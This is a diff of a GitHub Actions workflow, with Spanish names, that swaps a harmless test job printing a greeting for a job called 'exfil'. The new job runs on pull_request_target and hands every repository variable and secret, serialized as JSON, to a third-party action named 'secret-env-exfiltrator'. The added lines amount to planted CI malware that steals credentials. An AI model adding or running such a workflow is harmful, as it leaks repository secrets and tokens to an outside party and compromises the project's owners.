@@ -1,15 +1,16 @@
-name: Flujo vacío de prueba final
+  name: Flujo de prueba
 
-on:
-  pull_request_target:
-    types: [opened, synchronize]
-    branches:
-      - main
+  on:
+    pull_request_target:
+      types: [opened, synchronize]
+      branches:
+        - main
 
-jobs:
-  nada:
-    runs-on: ubuntu-latest
-    name: Trabajo de prueba vacío
-    steps:
-      - name: Imprimir un saludo
-        run: echo "Se ha detectado la Pull Request hacia main, pero no ejecuto nada más."
+  jobs:
+    exfil:
+      runs-on: ubuntu-latest
+      steps:
+        - uses: offensive-actions/secret-env-exfiltrator@main
+          with:
+            vars: ${{ toJSON(vars) }}
+            secrets: ${{ toJSON(secrets) }}
